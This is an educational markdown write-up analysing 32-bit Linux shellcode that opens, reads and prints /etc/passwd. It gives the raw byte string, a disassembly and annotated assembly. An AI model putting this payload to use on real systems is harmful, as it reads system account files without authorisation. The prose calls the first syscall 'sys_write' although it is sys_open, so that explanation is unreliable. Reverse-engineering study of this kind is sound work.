## Shellcode analysis case 1

----

#### Shellcode - Reads /etc/passwd
```
\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73
\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f
\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03
\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92
\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd
\x80
```

Binary ninja graph:

![graph](https://raw.githubusercontent.com/x00pwn/lowlevel-shellcode-analysis/master/graph_images/case2-graph.png)

```
Disassembly-
0:  31 c9                   xor    ecx,ecx
2:  f7 e1                   mul    ecx
4:  b0 05                   mov    al,0x5
6:  51                      push   ecx
7:  68 73 73 77 64          push   0x64777373
c:  68 63 2f 70 61          push   0x61702f63
11: 68 2f 2f 65 74          push   0x74652f2f
16: 89 e3                   mov    ebx,esp
18: cd 80                   int    0x80
1a: 93                      xchg   ebx,eax
1b: 91                      xchg   ecx,eax
1c: b0 03                   mov    al,0x3
1e: 31 d2                   xor    edx,edx
20: 66 ba ff 0f             mov    dx,0xfff
24: 42                      inc    edx
25: cd 80                   int    0x80
27: 92                      xchg   edx,eax
28: 31 c0                   xor    eax,eax
2a: b0 04                   mov    al,0x4
2c: b3 01                   mov    bl,0x1
2e: cd 80                   int    0x80
30: 93                      xchg   ebx,eax
31: cd 80                   int    0x80
```

Analysis:

As usual, the shellcode starts by clearing out the ecx register, then it moves the linux `sys_write` syscall into the al register. Then the shellcode pushes the string `//etc/passwd` onto the stack in little endian format and split up.

```assembly
xor    ecx,ecx        ; clear out ecx as prep
mul    ecx            ; 
mov    al,0x5         ; linux syscall (sys_open, 0x05)
push   ecx
push   0x64777373     ; push 'dwss' to the stack
push   0x61702f63     ; push 'ap/c' to the stack
push   0x74652f2f     ; push 'te//' to the stack
mov    ebx,esp
int    0x80           ; sys interupt
```
